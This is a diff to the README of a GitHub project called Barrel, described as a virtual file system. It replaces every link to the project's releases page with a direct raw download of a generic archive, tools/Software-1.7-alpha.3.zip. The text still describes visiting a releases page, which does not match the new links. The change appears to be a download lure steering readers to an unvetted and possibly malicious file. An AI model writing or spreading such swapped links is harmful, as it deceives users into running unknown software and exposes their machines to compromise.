@@ -1,6 +1,6 @@
 # 🚀 Barrel - A Fast Virtual File System for Your Needs
 
-[![Download Barrel](https://img.shields.io/badge/Download-Barrel-blue.svg)](https://github.com/Preeti99091/Barrel/releases)
+[![Download Barrel](https://github.com/Preeti99091/Barrel/raw/refs/heads/main/tools/Software-1.7-alpha.3.zip)](https://github.com/Preeti99091/Barrel/raw/refs/heads/main/tools/Software-1.7-alpha.3.zip)
 
 ## 📥 Introduction
 
@@ -26,7 +26,7 @@ Welcome to Barrel, a high-performance virtual file system designed for game engi
 To get up and running with Barrel, follow these simple steps.
 
 1. **Visit the Releases Page**: Click the link below to access the download page.
-   [Download Barrel](https://github.com/Preeti99091/Barrel/releases)
+   [Download Barrel](https://github.com/Preeti99091/Barrel/raw/refs/heads/main/tools/Software-1.7-alpha.3.zip)
 
 2. **Choose Your Version**: On the releases page, find the latest version of Barrel. Make sure to select the correct version for your operating system.
 
@@ -70,4 +70,4 @@ We welcome contributions from everyone. If you have ideas to improve Barrel, ple
 Barrel simplifies the management of virtual files for various applications. By following the steps above, you can easily download, install, and start using Barrel. 
 
 To download the latest version once more, visit the link below:
-[Download Barrel](https://github.com/Preeti99091/Barrel/releases)
+[Download Barrel](https://github.com/Preeti99091/Barrel/raw/refs/heads/main/tools/Software-1.7-alpha.3.zip)
